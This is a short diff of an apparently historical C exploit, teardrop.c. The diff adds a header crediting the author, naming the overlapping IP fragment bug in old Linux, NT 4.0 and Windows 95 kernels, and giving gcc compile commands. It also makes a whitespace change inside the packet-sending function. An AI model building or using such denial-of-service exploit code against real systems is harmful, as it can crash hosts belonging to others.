@@ -1,3 +1,19 @@
+ /*
+* Copyright (c) 1997 route|daemon9 11.3.97
+*
+* Linux/NT/95 Overlap frag bug exploit
+*
+* Exploits the overlapping IP fragment bug present in all Linux kernels and
+* NT 4.0 / Windows 95 (others?)
+*
+* Based off of: flip.c by klepto
+* Compiles on: Linux, *BSD*
+*
+* gcc -O2 teardrop.c -o teardrop
+* OR
+* gcc -O2 teardrop.c -o teardrop -DSTRANGE_BSD_BYTE_ORDERING_THING
+*/
+
  #include <stdio.h> 
  #include <stdlib.h> 
  #include <unistd.h> 
@@ -89,7 +105,7 @@ void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt, u_short
     u_char *packet = NULL, *p_ptr = NULL; /* packet pointers */ 
     u_char byte; /* a byte */ 
     struct sockaddr_in sin; /* socket protocol structure */ 
-    
+
     sin.sin_family = AF_INET; 
     sin.sin_port = src_prt; 
     sin.sin_addr.s_addr = dst_ip; 
